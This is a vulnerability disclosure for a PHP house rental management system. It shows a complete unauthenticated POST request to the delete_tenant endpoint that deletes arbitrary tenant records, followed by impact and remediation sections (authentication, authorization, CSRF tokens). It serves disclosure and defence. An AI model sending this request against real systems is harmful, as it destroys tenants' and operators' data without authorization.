
### **Best House Rental Management System Unauthorized Tenant Deletion Vulnerability**

- **Exploit Title**: Best House Rental Management System Project in PHP Unauthorized Tenant Deletion Vulnerability  
- **Exploit Author**: Yasser Alshammari  
- **Vendor Homepage**: [SourceCodester](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)  
- **Software Link**: [Download Here](https://www.sourcecodester.com/download-code?nid=17375&title=Best+house+rental+management+system+project+in+php+)  
- **Version**: Best House Rental Management System Project in PHP v1.0  
- **Tested On**: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.12  
- **CVE**: Reported, waiting for CVE number  

### **Description**

The `/rental/ajax.php?action=delete_tenant` endpoint in the **Best House Rental Management System Project in PHP v1.0** is vulnerable to unauthorized tenant deletion. This occurs because the application does not validate user authentication or authorization before processing the deletion request. An attacker can exploit this vulnerability to delete any tenant by sending a specially crafted POST request with the tenant ID.

### **Payload Used**

```sh
POST /rental/ajax.php?action=delete_tenant HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 5
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/rental/index.php?page=tenants
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

id=12
```

### **Proof of Concept**

Submit the above POST request to the `/rental/ajax.php?action=delete_tenant` endpoint, replacing `id=12` with the ID of any tenant to delete. Observe that the specified tenant record is deleted without requiring authentication or authorization.


### **Impact**

An attacker can delete any tenant record without authentication or authorization. This can result in:
- Loss of critical tenant data.
- Disruption of business operations.
- Financial losses and reputational damage to the organization.

### **Remediation**

- **Authentication**: Require user authentication before processing sensitive operations like tenant deletion.
- **Authorization**: Validate that the requesting user has appropriate permissions to perform deletion actions.
- **CSRF Protection**: Implement CSRF tokens to prevent unauthorized requests from being executed.
